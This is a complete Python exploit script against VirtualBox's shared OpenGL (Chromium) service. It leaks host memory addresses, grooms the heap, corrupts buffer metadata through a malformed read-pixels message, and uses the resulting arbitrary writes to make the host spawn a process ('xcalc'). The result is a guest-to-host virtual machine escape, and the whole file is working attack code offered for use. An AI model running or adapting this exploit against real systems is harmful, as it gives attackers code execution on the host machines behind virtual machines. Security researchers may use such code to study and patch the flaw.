#/usr/bin/python
import sys, os
from struct import pack, unpack
sys.path.append(os.path.abspath(os.path.dirname(__file__)) + '/lib')
from chromium import *

def nop_msg():
    msg = (
            pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
            + '\x00\x00\x00' + chr(CR_NOP_OPCODE)
            + pack("<IIII", 0x41414141, 0x41414141, 0x41414141, 0x41414141)
            )
    return msg

def make_leak_msg(offset):
    msg = (
            pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
            + '\x00\x00\x00' + chr(CR_EXTEND_OPCODE)
            + pack("<I", offset)
            + pack("<I", CR_GETATTRIBLOCATION_EXTEND_OPCODE)
            + "AAAA"
        )
    return msg

def make_pixel_msg():
    msg = (
            pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
            + '\x00\x00\x00' + chr(CR_READPIXELS_OPCODE)
            + pack("<Q", 0x41414141) # CRMessageHeader
            + pack("<I", 0x4242) # width
            + pack("<I", 0x08) # height o   <<<<<<<<<<<<<<<<<<<<<<<<                
            + pack("<I", 0x35) # bytes_per_row x
            + pack("<I", 0x00) # stride
            + pack("<I", 0x24cee40) # alignment
            + pack("<I", 0x00) # skipRows
            + pack("<I", 0x00) # skipPixels
            + pack("<I", 0x00) # rowLength
            + pack("<I", 0x1FFFFFFD) # format x -> bytes_per_row <<<<<<<<
            + pack("<I", 0x5151) # type
            + pack("<I", 0xdeadbeef) # CRNetworkPointer <<<<<<< uId
            + pack("<I", 0x1000) # <<<<<< uSize
            )
    return msg

def make_crspawn_msg(addr):
    msg = (
            pack("<III", CR_MESSAGE_OPCODES, 0, 1)
            + '\x00\x00\x00' + chr(CR_BOUNDSINFOCR_OPCODE)
            + pack("<I", 0x41414141)
            + "xcal"
            + "c\x00\x00\x00"
            + pack("<I", 0x42424242)
            + pack("<I", 0x43434343)
            + pack("<I", 0x44444444)
        )
    return msg


if __name__ == '__main__':
    client = hgcm_connect("VBoxSharedCrOpenGL")
    set_version(client)
    
    # leak cr_server
    msg = make_leak_msg(0x190)
    resp = crmsg(client, msg)
    print repr(resp)
    _leak = unpack('<Q', resp[8:16])[0]
    _cr_server = _leak + 0x22ec60
    _OpenGL = _cr_server - 0x318700
    _crError = _OpenGL + 0x30f2f0
    _boundInfo = _cr_server + 44696
    _crSpawn = _cr_server - 0x5361f0
    _return_ptr = _cr_server - 8224
    print "leak = " + hex(_leak)        
    print "cr_server_addr = " + hex(_cr_server)
    print "boundinfo_addr = " + hex(_boundInfo)
    print "OpenGL_addr = " + hex(_OpenGL)
    
    hgcm_disconnect(client)
    client = hgcm_connect("VBoxSharedCrOpenGL")
    set_version(client)
    bufs = []
    for i in range(0, 0x100):
        buf = alloc_buf(client, 0x20, "CHARLIEE"*0x2)
        if buf % 2 == 0:
            bufs.append(buf)

    for i in bufs:
        hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [i, "A"*0x20, 1337])

    for i in range(0, 10):
        alloc_buf(client, 0x20, "CHARLIEE"*0x2)

    msg = make_pixel_msg()
    crmsg(client, msg)
    
     
    payload = "T"*0x20
    payload += pack("<Q", 0)
    payload += pack("<Q", 0x35)
    payload += pack("<I", 0xdeedbeef)
    payload += pack("<I", 0x1000)
    payload += pack("<Q", _boundInfo)
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeadbeef, 0x1000, 0, payload])
    

    payload = pack("<Q", _crSpawn)
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeedbeef, 0x1000, 0, payload])

    _bss = 0x24cee40

    payload = "T"*0x20
    payload += pack("<Q", 0)
    payload += pack("<Q", 0x35)
    payload += pack("<I", 0xdeedbeef)
    payload += pack("<I", 0x1000)
    payload += pack("<Q", _bss)
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeadbeef, 0x1000, 0, payload])


    payload = "xcalc"
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeedbeef, 0x1000, 0, payload])
        

    payload = pack("<Q", _bss)
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [0xdeedbeef, 0x1000, 0, payload])


    msg = make_crspawn_msg(_bss)
    crmsg(client, msg)
    
 


